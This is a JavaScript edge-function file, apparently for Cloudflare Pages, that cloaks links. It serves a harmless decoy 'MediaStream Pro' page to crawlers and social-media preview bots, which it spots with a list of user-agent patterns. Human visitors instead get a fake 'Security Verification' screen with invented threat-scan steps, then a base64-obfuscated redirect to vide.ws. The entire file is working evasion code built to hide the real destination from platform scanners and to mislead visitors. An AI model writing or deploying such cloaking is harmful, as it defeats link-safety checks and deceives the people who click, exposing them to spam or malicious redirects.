export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    const host = request.headers.get('host');
    
    console.log(`🔄 Processing: ${path} from ${host}`);

    // ADVANCED BOT DETECTION
    const userAgent = request.headers.get('user-agent') || '';
    const accept = request.headers.get('accept') || '';
    const acceptLanguage = request.headers.get('accept-language') || '';
    
    const isTwitterBot = userAgent.includes('Twitterbot');
    const isOtherBot = detectOtherBots(userAgent, accept, acceptLanguage);
    
    console.log(`🤖 Detection - Twitter: ${isTwitterBot}, Other: ${isOtherBot}`);

    if (isTwitterBot || isOtherBot) {
      // BOTS: Safe content (no redirect)
      console.log(`🛡️ Serving safe content to bot`);
      return serveSafeContent(path, host);
    } else {
      // HUMANS: Interactive verification + redirect
      console.log(`👤 Serving verification to human`);
      return serveHumanVerification(path, host);
    }
  } catch (error) {
    console.error('❌ Error:', error);
    return new Response('Internal Server Error', { status: 500 });
  }
}

// ===== ADVANCED BOT DETECTION =====
function detectOtherBots(userAgent, accept, acceptLanguage) {
  const botPatterns = [
    /bot/i, /crawler/i, /spider/i, /monitoring/i,
    /facebookexternalhit/i, /WhatsApp/i, /TelegramBot/i,
    /Discordbot/i, /Slackbot/i, /Googlebot/i, /Bingbot/i,
    /YandexBot/i, /DuckDuckBot/i, /LinkedInBot/i
  ];
  
  const isBotByUA = botPatterns.some(pattern => pattern.test(userAgent));
  const hasNoAcceptLanguage = !acceptLanguage;
  const hasSimpleAccept = accept.includes('*/*');
  
  return isBotByUA || (hasNoAcceptLanguage && hasSimpleAccept);
}

// ===== PATH MAPPING =====
function getTargetPath(sourcePath) {
  const pathMappings = {
    '/d/': '/e/',
    '/f/': '/f/',
    '/v/': '/d/',
    '/s/': '/c/'
  };
  
  for (const [sourceBase, targetBase] of Object.entries(pathMappings)) {
    if (sourcePath.startsWith(sourceBase)) {
      const remainingPath = sourcePath.slice(sourceBase.length);
      return `https://vide.ws${targetBase}${remainingPath}`;
    }
  }
  
  return 'https://vide.ws/';
}

// ===== SAFE CONTENT FOR BOTS =====
function serveSafeContent(path, host) {
  const pathId = path.split('/').pop() || 'content';
  
  const safeHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MediaStream Pro - Video Content Platform</title>
    <meta name="description" content="Stream high-quality video content on MediaStream Pro. Premium streaming platform with extensive content library.">
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="MediaStream Pro - Video Platform">
    <meta name="twitter:description" content="Premium video streaming platform with HD content">
    <meta name="twitter:image" content="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=1200&h=630&fit=crop">
    
    <!-- Open Graph -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="MediaStream Pro - Video Platform">
    <meta property="og:description" content="Premium video streaming platform with HD content">
    <meta property="og:image" content="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=1200&h=630&fit=crop">
    <meta property="og:url" content="https://${host}${path}">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
        .container {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        h1 {
            color: #2d3748;
            margin-bottom: 15px;
            font-size: 1.8em;
        }
        .content-id {
            background: #edf2f7;
            padding: 8px 16px;
            border-radius: 20px;
            font-family: 'Courier New', monospace;
            color: #4a5568;
            font-weight: bold;
            margin: 15px 0;
            display: inline-block;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 25px 0;
        }
        .feature {
            background: #f7fafc;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        .feature-icon {
            font-size: 1.5em;
            margin-bottom: 8px;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            font-size: 0.9em;
            color: #718096;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 0;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🎬</div>
        <h1>MediaStream Pro</h1>
        <p>Premium Video Streaming Platform</p>
        
        <div class="content-id">Content ID: ${pathId}</div>
        
        <div class="features">
            <div class="feature">
                <div class="feature-icon">🔒</div>
                <div>Secure Streaming</div>
            </div>
            <div class="feature">
                <div class="feature-icon">📱</div>
                <div>Mobile Optimized</div>
            </div>
            <div class="feature">
                <div class="feature-icon">⚡</div>
                <div>Fast Delivery</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🌐</div>
                <div>Global CDN</div>
            </div>
        </div>
        
        <div class="stats">
            <div>🎥 10K+ Videos</div>
            <div>👥 50K+ Users</div>
            <div>⭐ 4.8 Rating</div>
        </div>
        
        <button class="btn" onclick="window.location.href='/library'">
            Explore Library
        </button>
        
        <p style="margin-top: 20px; font-size: 0.9em; color: #718096;">
            Join thousands of users enjoying premium content
        </p>
    </div>
</body>
</html>`;

  return new Response(safeHtml, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=300'
    }
  });
}

// ===== HUMAN VERIFICATION + REDIRECT =====
function serveHumanVerification(path, host) {
  const targetUrl = getTargetPath(path);
  const obfuscatedUrl = btoa(targetUrl).replace(/=/g, '');
  
  const verificationHtml = `<!DOCTYPE html>
<html>
<head>
    <title>Security Verification - MediaStream Pro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Safe Meta Tags for Verification -->
    <meta property="og:title" content="Security Verification - MediaStream Pro">
    <meta property="og:description" content="Complete verification to access premium content">
    <meta property="twitter:card" content="summary">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .verification-container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .security-icon {
            font-size: 4em;
            margin-bottom: 20px;
        }
        h1 {
            margin-bottom: 10px;
            font-size: 1.8em;
        }
        .verification-steps {
            text-align: left;
            margin: 30px 0;
        }
        .step {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            border-left: 4px solid #4299e1;
        }
        .step-icon {
            width: 35px;
            height: 35px;
            background: #4299e1;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
        }
        .verify-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 1.1em;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 20px 0;
            width: 100%;
            max-width: 300px;
        }
        .verify-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.3);
        }
        .verify-btn:disabled {
            background: #718096;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .loading-bar {
            height: 6px;
            background: rgba(255,255,255,0.2);
            border-radius: 3px;
            overflow: hidden;
            margin: 20px 0;
            display: none;
        }
        .loading-progress {
            height: 100%;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            width: 0%;
            transition: width 0.3s ease;
        }
        .status-message {
            margin: 20px 0;
            padding: 15px;
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            display: none;
        }
        .privacy-note {
            margin-top: 25px;
            font-size: 0.85em;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="verification-container">
        <div class="security-icon">🔒</div>
        <h1>Security Verification Required</h1>
        <p>Please complete verification to access premium content</p>
        
        <div class="verification-steps">
            <div class="step">
                <div class="step-icon">1</div>
                <div>
                    <strong>Human Verification</strong><br>
                    <small>Confirm you are not automated</small>
                </div>
            </div>
            <div class="step">
                <div class="step-icon">2</div>
                <div>
                    <strong>Security Scan</strong><br>
                    <small>Checking for threats</small>
                </div>
            </div>
            <div class="step">
                <div class="step-icon">3</div>
                <div>
                    <strong>Access Grant</strong><br>
                    <small>Preparing your content</small>
                </div>
            </div>
        </div>
        
        <button class="verify-btn" id="verifyBtn">
            Start Verification
        </button>
        
        <div class="loading-bar" id="loadingBar">
            <div class="loading-progress" id="loadingProgress"></div>
        </div>
        
        <div class="status-message" id="statusMessage"></div>
        
        <div class="privacy-note">
            🔒 This verification helps protect against automated access and ensures content security.
        </div>
    </div>

    <script>
        let verificationStep = 0;
        let userInteracted = false;
        
        document.getElementById('verifyBtn').addEventListener('click', function() {
            if (!userInteracted) {
                userInteracted = true;
                startVerification();
            }
        });
        
        // Track user interactions
        ['click', 'scroll', 'mousemove', 'keydown'].forEach(event => {
            document.addEventListener(event, () => {
                if (!userInteracted) userInteracted = true;
            });
        });
        
        function startVerification() {
            const btn = document.getElementById('verifyBtn');
            const loadingBar = document.getElementById('loadingBar');
            const loadingProgress = document.getElementById('loadingProgress');
            const statusMessage = document.getElementById('statusMessage');
            
            btn.disabled = true;
            loadingBar.style.display = 'block';
            statusMessage.style.display = 'block';
            
            const steps = [
                { message: '🔍 Verifying human interaction...', progress: 20 },
                { message: '🛡️ Running security scan...', progress: 40 },
                { message: '🔐 Establishing secure connection...', progress: 60 },
                { message: '📡 Connecting to content delivery...', progress: 80 },
                { message: '✅ Verification complete! Redirecting...', progress: 100 }
            ];
            
            function executeStep() {
                if (verificationStep < steps.length) {
                    const step = steps[verificationStep];
                    statusMessage.innerHTML = step.message;
                    loadingProgress.style.width = step.progress + '%';
                    
                    if (verificationStep === steps.length - 1) {
                        btn.innerHTML = '✅ Access Granted';
                    } else {
                        btn.innerHTML = '🔄 Verifying...';
                    }
                    
                    verificationStep++;
                    setTimeout(executeStep, 1200);
                } else {
                    // Final redirect dengan obfuscation
                    setTimeout(() => {
                        const encodedUrl = '${obfuscatedUrl}';
                        const padding = 4 - (encodedUrl.length % 4);
                        const paddedUrl = encodedUrl + '='.repeat(padding);
                        
                        try {
                            const targetUrl = atob(paddedUrl);
                            window.location.href = targetUrl;
                        } catch (error) {
                            window.location.href = 'https://vide.ws/';
                        }
                    }, 1000);
                }
            }
            
            executeStep();
        }
        
        // Auto-focus untuk accessibility
        document.getElementById('verifyBtn').focus();
    </script>
</body>
</html>`;

  return new Response(verificationHtml, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate'
    }
  });
}
